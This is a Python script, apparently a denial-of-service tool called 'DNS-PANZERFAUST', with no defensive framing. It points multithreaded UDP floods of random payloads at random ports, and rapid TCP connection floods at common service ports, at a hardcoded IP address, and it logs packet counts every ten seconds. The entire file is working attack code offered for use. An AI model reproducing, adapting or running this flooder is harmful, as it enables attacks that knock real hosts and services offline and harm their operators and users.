import socket
import threading
import random
import time

# ========== CONFIG ==========
TARGET_IP = "62.109.121.42"  # CHANGE THIS
UDP_THREADS = 15
SYN_THREADS = 10
PACKETS_SENT = [0]
RUNNING = True

# ========== PAYLOADS ==========
def random_payload():
    size = random.randint(64, 1450)
    return bytes([random.randint(0, 255) for _ in range(size)])

# ========== UDP FLOODER ==========
def udp_attacker():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    while RUNNING:
        batch_size = random.randint(125, 325)
        for _ in range(batch_size):
            try:
                # Random source port simulation
                sock.bind(('', random.randint(20000, 60000)))
                # Random destination port
                port = random.randint(1, 65535)
                sock.sendto(random_payload(), (TARGET_IP, port))
                PACKETS_SENT[0] += 1
            except:
                pass

# ========== SYN FLOODER ==========
def syn_attacker():
    while RUNNING:
        batch_size = random.randint(125, 325)
        for _ in range(batch_size):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                sock.settimeout(0.001)
                
                # Random TTL, window size variation
                sock.setsockopt(socket.SOL_IP, socket.IP_TTL, random.randint(32, 255))
                
                port = random.choice([80, 443, 53, 8080, 21, 22, 23, 7547])
                sock.connect_ex((TARGET_IP, port))
                PACKETS_SENT[0] += 1
                sock.close()
            except:
                pass

# ========== LOGGER ==========
def logger():
    last_count = 0
    while RUNNING:
        time.sleep(10)
        current = PACKETS_SENT[0]
        packets_in_10s = current - last_count
        last_count = current
        print(f"2M50:{packets_in_10s}")

# ========== MAIN ==========
print(f"DNS-PANZERFAUST targeting {TARGET_IP}")

# Start UDP threads
for _ in range(UDP_THREADS):
    t = threading.Thread(target=udp_attacker)
    t.daemon = True
    t.start()

# Start SYN threads
for _ in range(SYN_THREADS):
    t = threading.Thread(target=syn_attacker)
    t.daemon = True
    t.start()

# Start logger
log_thread = threading.Thread(target=logger)
log_thread.daemon = True
log_thread.start()

# Keep alive
try:
    while True:
        time.sleep(1)
except KeyboardInterrupt:
    RUNNING = False
    print("\nDNS-PANZERFAUST stopped.")
